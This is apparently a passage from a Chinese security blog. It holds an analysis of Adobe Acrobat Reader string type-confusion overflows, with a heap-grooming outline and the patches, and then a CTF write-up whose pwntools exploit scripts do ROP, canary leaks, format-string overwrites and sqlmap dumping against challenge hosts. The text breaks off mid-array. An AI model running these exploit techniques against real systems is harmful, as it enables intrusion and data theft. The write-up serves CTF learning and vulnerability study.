<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src &lt;- arg of unregisterReview / unregisterApproval</span></span><br><span class="line"><span class="comment">// src = "\xFE\xFF......"</span></span><br><span class="line"><span class="keyword">size_t</span> len = ASstrnlen_safe(src, <span class="number">0x7FFFFFFF</span>, <span class="number">0</span>);    <span class="comment">// ANSI Function</span></span><br><span class="line"><span class="keyword">char</span>* dst = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(len + <span class="number">1</span>);</span><br><span class="line">strcpy_safe(dst, <span class="number">0x7FFFFFFF</span>, src, <span class="number">0</span>);   <span class="comment">// Generic API -&gt; Unicode Function</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>所以，我们需要通过控制内存的布局来利用这个漏洞，以达到任意地址读写的目的</p>
<blockquote>
<p><code>ArrayBuffer</code>对象在任意读写时起到了很大的作用。<br>
当该对象中的成员<code>byteLength</code> &gt; <code>0x68</code>时，该对象的后备存储将从系统堆中分配。<br>
堆内存分配时，所分配的缓冲区会比之前大<code>0x10</code>。这部分<code>0x10</code>大小的内存用于存储<code>ObjectElements</code>中的变量。</p>
</blockquote>
<ul>
<li>
<p>新建大量的字符串和<code>ArrayBuffer</code>对象来占据内存。在这里我们创建了五个对象作为一个单元。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │    String   │ ArrayBuffer │ ArrayBuffer │ ArrayBuffer │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>将第一个和第三个内存区域释放，以创建大量的内存空洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│    Hole     │    String   │    Hole     │ ArrayBuffer │ ArrayBuffer │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使原始字符串的堆缓冲区分配到其中一个单元的第一个内存空洞，目标堆缓冲区分配到其中一个单元的第二个内存空洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│     Src     │    String   │     Dst     │ ArrayBuffer │ ArrayBuffer │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>通过<code>strcpy_safe</code>函数漏洞的越界拷贝，覆盖第四个<code>ArrayBuffer</code>的成员<code>byteLength</code>为<code>0xFFFF</code>。<br>
其中，String的内容(每个单元中的第二个对象)将用于覆盖<code>byteLength</code>。<br>
之后通过该单元中的第四个对象（被覆盖<code>byteLength</code>后的<code>ArrayBuffer</code>），修改单元中的第五个对象（也就是图中的最后一个<code>ArrayBuffer</code>）的<code>byteLength</code>为<code>0xFFFFFFFF</code>，以取得全局读写权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                     (2)byteLength to 0xFFFF             (4)Global Access</span><br><span class="line">               ┌───&gt;───&gt;───&gt;───&gt;───&gt;───&gt;───┐            &lt;──────┬──────&gt;</span><br><span class="line">┌─────────────┬┼────────────┬─────────────┬┼────────────┬──────┼──────┐</span><br><span class="line">│     Src     │   String    │     Dst     │ ArrayBuffer │ ArrayBuffer │</span><br><span class="line">└──────┼──────┴─────────────┴┼────────────┴┼────────────┴┼────────────┘</span><br><span class="line">       └──&gt;───&gt;───&gt;───&gt;────&gt;─┘             └──&gt;───&gt;───&gt;──┘</span><br><span class="line">          (1)strcpy_safe           (3)byteLength to 0xFFFFFFFF</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>一旦获得了全局读写权限，我们就可以向后搜索来计算<code>ArrayBuffer</code>对象的后备存储缓冲区的基址，从而获得任意地址读写权限。</p>
</li>
<li>
<p>一旦获得了任意读写权限后，就很容易实现代码执行。之后要做的就是下面这些操作，本文中不再赘述。</p>
<ul>
<li>EIP劫持</li>
<li>ASLR绕过</li>
<li>DEB绕过</li>
<li>CFG绕过</li>
</ul>
</li>
</ul>
<h4 id="3-漏洞修补分析-2">3) 漏洞修补分析</h4>
<ul>
<li>
<p>该漏洞已在adobe acrobat reader DC 2019.012.20034 版本中被修复。</p>
</li>
<li>
<p>在堆缓冲区的末尾增加了两个额外的<code>NULL</code>字节(总共3个)。</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__cdecl <span class="title">sub_2383F4F8</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// --------------------------- cut ---------------------------</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">string</span> ) &#123;</span><br><span class="line">    length = ASstrnlen_safe(<span class="built_in">string</span>, <span class="number">0x7FFFFFFF</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( length &lt; <span class="number">0xFFFFFFFC</span> ) &#123;</span><br><span class="line">      buffer = <span class="built_in">calloc</span>(<span class="number">1</span>, length + <span class="number">3</span>);   <span class="comment">// put 3 '\x00' at the end</span></span><br><span class="line">      <span class="built_in">memcpy</span>(buffer, <span class="built_in">string</span>, length);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// --------------------------- cut ---------------------------</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>这个补丁只能阻止漏洞被利用。POC仍然可能造成进程崩溃，因为如果目标堆缓冲区不够大，那么就无法存储<code>Unicode</code>字符串结束符。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src &lt;- arg of unregisterReview / unregisterApproval</span></span><br><span class="line"><span class="comment">// src = "\xFE\xFF......"</span></span><br><span class="line"><span class="keyword">size_t</span> len = ASstrnlen_safe(src, <span class="number">0x7FFFFFFF</span>, <span class="number">0</span>);    <span class="comment">// ANSI Function</span></span><br><span class="line"><span class="keyword">char</span>* dst = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(len + <span class="number">1</span>);    <span class="comment">// only sufficient for ANSI string</span></span><br><span class="line">strcpy_safe(dst, <span class="number">0x7FFFFFFF</span>, src, <span class="number">0</span>);   <span class="comment">// Generic API -&gt; Unicode Function</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>该漏洞最终在adobe acrobat reader DC 2019.021.20047版本中得到修复。通过为目标堆缓冲区分配2个额外字节来存储<code>Unicode</code>字符串终止符，解决了这个问题。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__cdecl <span class="title">sub_2212A50B</span><span class="params">(<span class="keyword">char</span> *src)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// --------------------------- cut ---------------------------</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> bytes = strnlen_safe(src, <span class="number">0x7FFFFFFF</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">void</span> *dst = <span class="built_in">malloc</span>(bytes + <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memset</span>(dst, <span class="number">0</span>, bytes + <span class="number">2</span>);</span><br><span class="line">  strcpy_safe_wrapper(dst, src);</span><br><span class="line">  <span class="comment">// --------------------------- cut ---------------------------</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">strcpy_safe_wrapper</span><span class="params">(<span class="keyword">int</span> dst, <span class="keyword">int</span> src)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> strcpy_safe(dst, <span class="number">0x7FFFFFFF</span>, src, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>白皮书后剩余的<code>CVE-2020-3805</code>由于原理与上述两个漏洞大致相同，故不再赘述。</p>
</blockquote>
<h2 id="4-总结">4. 总结</h2>
<ul>
<li>在这篇针对adobe acrobat Reader DC的漏洞分析中，大部分漏洞都是因为字符串类型混淆，导致<code>ANSI</code>字符串被 <strong>本用于处理<code>Unicode</code>字符串的函数</strong> 错误操作，其中以<code>strnlen_safe</code>为代表。</li>
<li>在此类型漏洞中，因为在<code>ANSI</code>字符串中找不到<code>Unicode</code>字符串终结符，所以会造成越界 <strong>读/写</strong>，形成了一种漏洞模型，产生了4个<code>CVE</code>。</li>
<li>漏洞修补的方式也大同小异：在缓冲区末尾追加2个及以上的<code>NULL</code>字符，防止越界。</li>
</ul>
<blockquote>
<p>学习所使用的 <a href="/2020/06/ANSI-Unicode-type-confusion-study/pwning_adobe_reader_multiple_times_with_malformed_strings_whitepaper.pdf" title="白皮书">白皮书</a> 与 <a href="/2020/06/ANSI-Unicode-type-confusion-study/pwning_adobe_reader_multiple_times_with_malformed_strings_slides.pdf" title="PPT">PPT</a> 如有需要请自取。议题的连接请点击<a href="https://conference.hitb.org/hitbsecconf2020ams/sessions/pwning-adobe-reader-multiple-times-with-malformed-strings/" target="_blank" rel="noopener">这里</a></p>
</blockquote>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>malformed strings</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF五校联赛</title>
    <url>/2020/06/actf2020/</url>
    <content><![CDATA[<h2 id="1-Pwn">1. Pwn</h2>
<h3 id="1-secret-of-girlfriend">1. secret_of_girlfriend</h3>
<h4 id="分析">分析</h4>
<ul>
<li>程序中有三处地方内藏flag，两处在data段，一处在bss。其中有两处会被销毁，只剩下一处flag还存在。</li>
<li>程序内部有缓冲区溢出，开启<code>Canary</code>保护</li>
<li>通过缓冲区溢出，覆盖栈上<code>environ</code>处指向程序名称的指针为flag地址，并通过<code>___stack_chk_fail</code>将剩下一处flag打印出来就好</li>
</ul>
<blockquote>
<p>实际上如果三处flag都被覆盖，仍然有办法可以得到flag。</p>
</blockquote>
<a id="more"></a>
<h4 id="部分EXP">部分EXP</h4>
<blockquote>
<p>完整exp在pwn部分最后</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ELFname == <span class="string">"./secret_of_girlfriend"</span>:</span><br><span class="line">    debug(<span class="string">"b * 0x40090c\nc"</span>)</span><br><span class="line">    sla(<span class="string">"fogot =v=."</span>, flat(cyclic(<span class="number">0x118</span>), <span class="number">0x00000000006010E0</span>))</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="2-frame">2. frame</h3>
<h4 id="分析-2">分析</h4>
<ul>
<li>程序白给栈地址，明摆着栈劫持</li>
<li>程序在函数内部会两次调用read和printf<br>
我们需要通过第一次read，覆盖Canary的最低一字节，从而泄露Canary<br>
然后通过第二次read劫持栈，执行<code>write(0, got['write'], rdx)</code>，泄露出write的libc地址和libc版本，进而计算出system的libc地址<br>
之后使其重新执行<code>vuln</code>函数</li>
<li>再次栈劫持时直接执行<code>system(“sh”)</code>，注意别忘记canary。<code>sh</code>字符串截取自程序<code>LOAD</code>段上的<code>flush</code>字符串。（如果没记错应该是<code>LOAD</code>段）</li>
</ul>
<h4 id="部分EXP-2">部分EXP</h4>
<blockquote>
<p>完整exp在pwn部分最后</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ELFname == <span class="string">"./frame"</span>:</span><br><span class="line">    rdi = <span class="number">0x4012db</span></span><br><span class="line">    rdx_rsi = <span class="number">0x40118c</span></span><br><span class="line">    leave_ret = <span class="number">0x40125f</span></span><br><span class="line">    ru(<span class="string">"gift:"</span>)</span><br><span class="line">    msg = ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    new_stack = int(msg, <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">"msg: "</span> + msg)</span><br><span class="line"></span><br><span class="line">    sa(<span class="string">"&gt;"</span>, cyclic(<span class="number">0x59</span>))</span><br><span class="line">    rv(<span class="number">0x58</span>)</span><br><span class="line">    msg = rv(<span class="number">8</span>)</span><br><span class="line">    canary = u64(<span class="string">'\x00'</span> + msg[<span class="number">1</span>:])</span><br><span class="line">    log.info(<span class="string">"canary: "</span> + hex(canary))</span><br><span class="line">    payload = flat(cyclic(<span class="number">8</span>), rdi, <span class="number">1</span>, rdx_rsi, <span class="number">0x8</span>, e.got[<span class="string">'write'</span>], </span><br><span class="line">        e.symbols[<span class="string">'write'</span>], e.symbols[<span class="string">'vul'</span>], </span><br><span class="line">        cyclic(<span class="number">0x18</span>), canary, new_stack, leave_ret)</span><br><span class="line">    sa(<span class="string">"&gt;"</span>, payload)</span><br><span class="line">    rv(<span class="number">11</span>)</span><br><span class="line">    msg = rv(<span class="number">8</span>)</span><br><span class="line">    log.info(<span class="string">"libc_write_msg:"</span> + msg.encode(<span class="string">'hex'</span>))</span><br><span class="line">    libc_write = u64(msg)</span><br><span class="line">    log.info(<span class="string">"libc write:"</span> + hex(libc_write))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">"I'll give you a gift:"</span>)</span><br><span class="line">    msg = ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    new_stack = int(msg, <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">"stack_msg: "</span> + msg)</span><br><span class="line">    sh = <span class="number">0x40042f</span></span><br><span class="line">    obj = LibcSearcher(<span class="string">'write'</span>, libc_write)</span><br><span class="line">    system = libc_write - obj.dump(<span class="string">'write'</span>) + obj.dump(<span class="string">'system'</span>)</span><br><span class="line">    sa(<span class="string">"&gt;"</span>, cyclic(<span class="number">0x59</span>))</span><br><span class="line">    payload = flat(cyclic(<span class="number">8</span>), rdi, sh, system, </span><br><span class="line">        cyclic(<span class="number">0x38</span>), canary, new_stack, leave_ret)</span><br><span class="line">    debug(<span class="string">"b * 0x40118c\nb vul"</span>)</span><br><span class="line">    sla(<span class="string">"&gt;"</span>, payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="3-rdw">3. rdw</h3>
<h4 id="分析-3">分析</h4>
<ul>
<li>程序设置了prctl函数，无法直接get shell</li>
<li>程序中有明显的缓冲区溢出漏洞</li>
<li>尝试执行OpenReadWrite Flag</li>
</ul>
<blockquote>
<p>注意： 执行Read/Write函数时，<code>$rdx</code>必须要大一点，否则无法读取/写入对应的目标<br>
但程序中没有关于寄存器<code>$rdx</code>的gadget，所以需要多次返回至vuln函数来重置<code>$rdx</code>为较大的值</p>
</blockquote>
<h4 id="部分EXP-3">部分EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ELFname == <span class="string">'./rdw'</span>:</span><br><span class="line">    rdi = <span class="number">0x400a73</span></span><br><span class="line">    rsi_r15 = <span class="number">0x400a71</span></span><br><span class="line">    buf = <span class="number">0x0601090</span></span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">'flag\x00'</span>)</span><br><span class="line">    open = e.symbols[<span class="string">'open'</span>]</span><br><span class="line">    read = e.symbols[<span class="string">'read'</span>]</span><br><span class="line">    write = e.symbols[<span class="string">'write'</span>]</span><br><span class="line">    payload = flat(cyclic(<span class="number">0x58</span>), </span><br><span class="line">        rdi, buf, rsi_r15, <span class="number">0</span>, <span class="number">0</span>, open, <span class="number">0x40087B</span>)</span><br><span class="line">    sla(<span class="string">"who cares your input\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = flat(cyclic(<span class="number">0x58</span>), </span><br><span class="line">        rdi, <span class="number">3</span>, rsi_r15, buf, <span class="number">0</span>, read, <span class="number">0x40087B</span>)</span><br><span class="line">    sla(<span class="string">"who cares your input\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = flat(cyclic(<span class="number">0x58</span>), </span><br><span class="line">        rdi, <span class="number">1</span>, rsi_r15, buf, <span class="number">0</span>, write)</span><br><span class="line">    debug(<span class="string">"b * 0x4008B9"</span>)</span><br><span class="line">    sla(<span class="string">"who cares your input\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="4-repeat">4. repeat</h3>
<h4 id="分析-4">分析</h4>
<ul>
<li>格式化字符串漏洞，可执行20次</li>
<li>先泄露出<code>__libc_start_main_ret</code>地址，从而泄露出libc基地址与libc版本</li>
<li>计算出one_gadget地址</li>
<li>泄露出栈地址，然后计算<code>__libc_start_main_ret</code>所处的栈地址</li>
<li>往该地址写入one_gaget地址</li>
<li>注意：写入地址时最好一字节一字节写入，否则printf出来的数据会非常非常大，会造成卡顿乃至崩溃</li>
</ul>
<h4 id="部分EXP-4">部分EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ELFname == <span class="string">'./repeat'</span>:</span><br><span class="line">    sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"%19$p"</span>)</span><br><span class="line">    msg = ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    libc_start_main_ret = int(msg, <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">"libc_start_main_ret: "</span> + hex(libc_start_main_ret))</span><br><span class="line">    obj = LibcSearcher(<span class="string">"__libc_start_main_ret"</span>, libc_start_main_ret)</span><br><span class="line">    libc_base = libc_start_main_ret - obj.dump(<span class="string">'__libc_start_main_ret'</span>)</span><br><span class="line">    log.info(<span class="string">"libc base: "</span> + hex(libc_base))</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line"></span><br><span class="line">    sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"%16$p"</span>)</span><br><span class="line">    msg = ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    libc_start_main_ret_stack = int(msg, <span class="number">16</span>) + <span class="number">8</span></span><br><span class="line">    target_addr_str = hex(one_gadget)</span><br><span class="line">    debug()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        idx = target_addr_str[<span class="number">-2</span>:]</span><br><span class="line">        target_addr_str = target_addr_str[:<span class="number">-2</span>]</span><br><span class="line">        input_idx = str(int(idx, <span class="number">16</span>))</span><br><span class="line">        sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"%"</span> + input_idx +<span class="string">"c%10$hhn"</span> +</span><br><span class="line">            <span class="string">'\x00'</span> * (<span class="number">7</span> - len(input_idx)) +</span><br><span class="line">            p64(libc_start_main_ret_stack + i))</span><br><span class="line">    sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"quit"</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="完整EXP">* 完整EXP</h3>
<blockquote>
<p>当初忘记还要写WriteUp，否则EXP就不会这么难看了 T_T</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ELFname = <span class="string">"./repeat"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"39.107.46.219"</span>, <span class="number">40011</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(ELFname)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF("./libc.so.6")</span></span><br><span class="line">e = ELF(ELFname)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> msg, content : io.sendlineafter(msg, content)</span><br><span class="line">sa = <span class="keyword">lambda</span> msg, content : io.sendafter(msg, content)</span><br><span class="line">sl = <span class="keyword">lambda</span> content : io.sendline(content)</span><br><span class="line">rv = <span class="keyword">lambda</span> x=<span class="literal">None</span> : io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> msg : io.recvuntil(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(msg = <span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, msg)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ELFname == <span class="string">"./secret_of_girlfriend"</span>:</span><br><span class="line">    debug(<span class="string">"b * 0x40090c\nc"</span>)</span><br><span class="line">    sla(<span class="string">"fogot =v=."</span>, flat(cyclic(<span class="number">0x118</span>), <span class="number">0x00000000006010E0</span>))</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">if</span> ELFname == <span class="string">"./frame"</span>:</span><br><span class="line">    rdi = <span class="number">0x4012db</span></span><br><span class="line">    rdx_rsi = <span class="number">0x40118c</span></span><br><span class="line">    leave_ret = <span class="number">0x40125f</span></span><br><span class="line">    ru(<span class="string">"gift:"</span>)</span><br><span class="line">    msg = ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    new_stack = int(msg, <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">"msg: "</span> + msg)</span><br><span class="line"></span><br><span class="line">    sa(<span class="string">"&gt;"</span>, cyclic(<span class="number">0x59</span>))</span><br><span class="line">    rv(<span class="number">0x58</span>)</span><br><span class="line">    msg = rv(<span class="number">8</span>)</span><br><span class="line">    canary = u64(<span class="string">'\x00'</span> + msg[<span class="number">1</span>:])</span><br><span class="line">    log.info(<span class="string">"canary: "</span> + hex(canary))</span><br><span class="line">    payload = flat(cyclic(<span class="number">8</span>), rdi, <span class="number">1</span>, rdx_rsi, <span class="number">0x8</span>, e.got[<span class="string">'write'</span>], </span><br><span class="line">        e.symbols[<span class="string">'write'</span>], e.symbols[<span class="string">'vul'</span>], </span><br><span class="line">        cyclic(<span class="number">0x18</span>), canary, new_stack, leave_ret)</span><br><span class="line">    sa(<span class="string">"&gt;"</span>, payload)</span><br><span class="line">    rv(<span class="number">11</span>)</span><br><span class="line">    msg = rv(<span class="number">8</span>)</span><br><span class="line">    log.info(<span class="string">"libc_write_msg:"</span> + msg.encode(<span class="string">'hex'</span>))</span><br><span class="line">    libc_write = u64(msg)</span><br><span class="line">    log.info(<span class="string">"libc write:"</span> + hex(libc_write))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">"I'll give you a gift:"</span>)</span><br><span class="line">    msg = ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    new_stack = int(msg, <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">"stack_msg: "</span> + msg)</span><br><span class="line">    sh = <span class="number">0x40042f</span></span><br><span class="line">    obj = LibcSearcher(<span class="string">'write'</span>, libc_write)</span><br><span class="line">    system = libc_write - obj.dump(<span class="string">'write'</span>) + obj.dump(<span class="string">'system'</span>)</span><br><span class="line">    sa(<span class="string">"&gt;"</span>, cyclic(<span class="number">0x59</span>))</span><br><span class="line">    payload = flat(cyclic(<span class="number">8</span>), rdi, sh, system, </span><br><span class="line">        cyclic(<span class="number">0x38</span>), canary, new_stack, leave_ret)</span><br><span class="line">    debug(<span class="string">"b * 0x40118c\nb vul"</span>)</span><br><span class="line">    sla(<span class="string">"&gt;"</span>, payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">if</span> ELFname == <span class="string">'./rdw'</span>:</span><br><span class="line">    rdi = <span class="number">0x400a73</span></span><br><span class="line">    rsi_r15 = <span class="number">0x400a71</span></span><br><span class="line">    buf = <span class="number">0x0601090</span></span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">'flag\x00'</span>)</span><br><span class="line">    open = e.symbols[<span class="string">'open'</span>]</span><br><span class="line">    read = e.symbols[<span class="string">'read'</span>]</span><br><span class="line">    write = e.symbols[<span class="string">'write'</span>]</span><br><span class="line">    payload = flat(cyclic(<span class="number">0x58</span>), </span><br><span class="line">        rdi, buf, rsi_r15, <span class="number">0</span>, <span class="number">0</span>, open, <span class="number">0x40087B</span>)</span><br><span class="line">    sla(<span class="string">"who cares your input\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = flat(cyclic(<span class="number">0x58</span>), </span><br><span class="line">        rdi, <span class="number">3</span>, rsi_r15, buf, <span class="number">0</span>, read, <span class="number">0x40087B</span>)</span><br><span class="line">    sla(<span class="string">"who cares your input\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = flat(cyclic(<span class="number">0x58</span>), </span><br><span class="line">        rdi, <span class="number">1</span>, rsi_r15, buf, <span class="number">0</span>, write)</span><br><span class="line">    debug(<span class="string">"b * 0x4008B9"</span>)</span><br><span class="line">    sla(<span class="string">"who cares your input\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">if</span> ELFname == <span class="string">'./repeat'</span>:</span><br><span class="line">    sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"%19$p"</span>)</span><br><span class="line">    msg = ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    libc_start_main_ret = int(msg, <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">"libc_start_main_ret: "</span> + hex(libc_start_main_ret))</span><br><span class="line">    obj = LibcSearcher(<span class="string">"__libc_start_main_ret"</span>, libc_start_main_ret)</span><br><span class="line">    libc_base = libc_start_main_ret - obj.dump(<span class="string">'__libc_start_main_ret'</span>)</span><br><span class="line">    log.info(<span class="string">"libc base: "</span> + hex(libc_base))</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line"></span><br><span class="line">    sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"%16$p"</span>)</span><br><span class="line">    msg = ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    libc_start_main_ret_stack = int(msg, <span class="number">16</span>) + <span class="number">8</span></span><br><span class="line">    target_addr_str = hex(one_gadget)</span><br><span class="line">    debug()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        idx = target_addr_str[<span class="number">-2</span>:]</span><br><span class="line">        target_addr_str = target_addr_str[:<span class="number">-2</span>]</span><br><span class="line">        input_idx = str(int(idx, <span class="number">16</span>))</span><br><span class="line">        log.info(<span class="string">"system index: "</span> + idx)</span><br><span class="line">        sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"%"</span> + input_idx +<span class="string">"c%10$hhn"</span> + </span><br><span class="line">            <span class="string">'\x00'</span> * (<span class="number">7</span> - len(input_idx)) + </span><br><span class="line">            p64(libc_start_main_ret_stack + i))</span><br><span class="line">    sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"quit"</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2-Web">2. Web</h2>
<h3 id="1-SQL注入入门题">1. SQL注入入门题</h3>
<ul>
<li>SQLmap跑起，简单省事</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">144  sqlmap -u http:&#x2F;&#x2F;106.15.207.47:22001&#x2F;\?id\&#x3D;1</span><br><span class="line">146  sqlmap -u http:&#x2F;&#x2F;106.15.207.47:22001&#x2F;\?id\&#x3D;1 --dbs</span><br><span class="line">147  sqlmap -u http:&#x2F;&#x2F;106.15.207.47:22001&#x2F;\?id\&#x3D;1 -D easy_sql_injection --tables</span><br><span class="line">148  sqlmap -u http:&#x2F;&#x2F;106.15.207.47:22001&#x2F;\?id\&#x3D;1 -D easy_sql_injection -T Notice --columns</span><br><span class="line">149  sqlmap -u http:&#x2F;&#x2F;106.15.207.47:22001&#x2F;\?id\&#x3D;1 -D easy_sql_injection -T Notice -C flag</span><br><span class="line">150  sqlmap -u http:&#x2F;&#x2F;106.15.207.47:22001&#x2F;\?id\&#x3D;1 -D easy_sql_injection -T Notice -C flag --dump</span><br></pre></td></tr></table></figure>
<h2 id="3-Crypto">3. Crypto</h2>
<h3 id="1-naive-encryption、">1. naive encryption、</h3>
<ul>
<li>暴力就完事儿了</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow_check</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0xfffff</span>):</span><br><span class="line">        n=long_to_bytes(i)</span><br><span class="line">        <span class="keyword">if</span>(sha512(n).hexdigest()[:<span class="number">20</span>]==<span class="string">"aed0a51e7826a82043f3"</span>):</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">pow_check()</span><br><span class="line"></span><br><span class="line">cipher=[<span class="number">71</span>, <span class="number">37</span>, <span class="number">4</span>, <span class="number">242</span>, <span class="number">109</span>, <span class="number">39</span>, <span class="number">241</span>, <span class="number">227</span>, <span class="number">104</span>, <span class="number">207</span>, <span class="number">210</span>, <span 